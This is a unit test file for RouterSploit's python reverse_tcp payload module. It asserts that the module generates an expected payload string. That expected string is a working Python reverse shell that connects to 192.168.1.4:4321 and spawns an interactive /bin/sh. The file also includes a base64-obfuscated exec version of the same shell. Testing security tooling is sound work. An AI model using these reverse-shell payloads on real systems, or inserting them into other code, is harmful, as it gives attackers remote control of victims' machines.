from routersploit.modules.payloads.python.reverse_tcp import Payload


# python reverse tcp payload with lhost=192.168.1.4 lport 4321
reverse_tcp = (
    "import socket,subprocess,os\n" +
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
    "s.connect(('192.168.1.4',4321))\n" +
    "os.dup2(s.fileno(),0)\n" +
    "os.dup2(s.fileno(),1)\n" +
    "os.dup2(s.fileno(),2)\n" +
    "p=subprocess.call([\"/bin/sh\",\"-i\"])"
)

# python reverse tcp payload with lhost=192.168.1.4 lport=4321 encoded with python/base64
reverse_tcp_encoded = (
    "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoJzE5Mi4xNjguMS40Jyw0MzIxKSkKb3MuZHVwMihzLmZpbGVubygpLDApCm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk='.decode('base64'))"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Payload()
    payload.lhost = "192.168.1.4"
    payload.lport = 4321

    assert payload.generate() == reverse_tcp
    assert payload.run() == reverse_tcp_encoded
